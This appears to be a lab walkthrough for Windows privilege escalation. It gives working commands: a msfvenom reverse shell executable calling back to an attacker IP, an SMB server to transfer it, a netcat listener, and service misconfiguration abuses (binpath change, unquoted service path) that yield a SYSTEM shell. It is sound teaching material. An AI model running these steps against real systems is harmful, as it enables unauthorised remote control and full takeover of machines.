# ROOM-01 Windows Privilege Escalation 

## Windows PrivEsc
* Registry Escalation
    * Autorun
    * AlwaysInstallElevated
* Service Escalation
    * Registry
    * Executable Files
    * DLL Hijacking
    * binPath
    * Unquoted Service Paths
    * Hot Potato
* Privilege Escalation
    * Startup Applications
    * Kernel Exploits
* Password Mining Escalation
    * Configuration Files
    * Memory

## Reverse Shell Executable

On **Kali**, generate a reverse shell executable (reverse.exe) using msfvenom. Update the LHOST IP address accordingly:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe
```

Transfer the reverse.exe file to the C:\PrivEsc directory on Windows. 
**Note:** There are many ways you could do this, however the simplest is to start an SMB server on **Kali** in the same directory as the file, and then use the standard Windows copy command to transfer the file.

On **Kali**, in the same directory as reverse.exe:

```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```

On **Windows** (update the IP address with your Kali IP):

```
copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe
```

On **Kali**, test the reverse shell by setting up a netcat listener:

```
sudo nc -nvlp 53
```
On **Windows**, run the reverse.exe executable and catch the shell:

```
C:\PrivEsc\reverse.exe
```

The reverse.exe executable will be used in many of the tasks in this room, so don't delete it!

## **Service Exploits**

### **Insecure Service Permissions**
On victim machine:\
Use **accesschk.exe** to check the "user" account's permissions on the "daclsvc" service:
```
C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
```

Note that the "user" account has the permission to change the service config (SERVICE_CHANGE_CONFIG).

Query the service and note that it runs with SYSTEM privileges (SERVICE_START_NAME):
```
sc qc daclsvc
```

Modify the service config and set the BINARY_PATH_NAME (binpath) to the reverse.exe executable you created:

```
sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
```

On Kali, start a listener.\
On victim, start the service to spawn a reverse shell running with SYSTEM privileges:
```
net start daclsvc
```

### **Unquoted Service Path**
Query the "unquotedsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME) and that the BINARY_PATH_NAME is unquoted and contains spaces.
```
sc qc unquotedsvc
```
Using accesschk.exe, note that the BUILTIN\Users group is allowed to write to the C:\Program Files\Unquoted Path Service\ directory:
```
C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
```
Copy the reverse.exe executable you created to this directory and rename it Common.exe:
```
copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
```
Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:
```
net start unquotedsvc
```
